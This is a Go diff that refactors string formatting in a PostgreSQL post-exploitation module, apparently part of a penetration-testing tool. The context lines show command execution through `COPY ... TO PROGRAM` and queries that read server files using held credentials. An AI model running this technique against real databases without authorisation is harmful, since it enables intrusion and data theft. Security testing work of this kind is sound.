@@ -28,10 +28,10 @@ func (p *PostgresExploit) CopyProgram(creds *DBCreds, result *PostExploitResult)
 		query := fmt.Sprintf(`COPY (SELECT '') TO PROGRAM '%s'`, cmd)
 		resp, err := p.executeQuery(creds, query)
 		if err != nil {
-			output.WriteString(fmt.Sprintf("[%s] Error: %v\n", cmd, err))
+			fmt.Fprintf(&output, "[%s] Error: %v\n", cmd, err)
 			continue
 		}
-		output.WriteString(fmt.Sprintf("[%s] Output: %s\n", cmd, resp))
+		fmt.Fprintf(&output, "[%s] Output: %s\n", cmd, resp)
 	}
 
 	if output.Len() > 0 {
@@ -104,11 +104,11 @@ func (p *PostgresExploit) FSAccess(creds *DBCreds, result *PostExploitResult) (*
 	for _, q := range queries {
 		resp, err := p.executeQuery(creds, q.query)
 		if err != nil {
-			output.WriteString(fmt.Sprintf("[%s] Error: %v\n", q.name, err))
+			fmt.Fprintf(&output, "[%s] Error: %v\n", q.name, err)
 			continue
 		}
 		if resp != "" {
-			output.WriteString(fmt.Sprintf("[%s] Content:\n%s\n\n", q.name, resp))
+			fmt.Fprintf(&output, "[%s] Content:\n%s\n\n", q.name, resp)
 		}
 	}
 
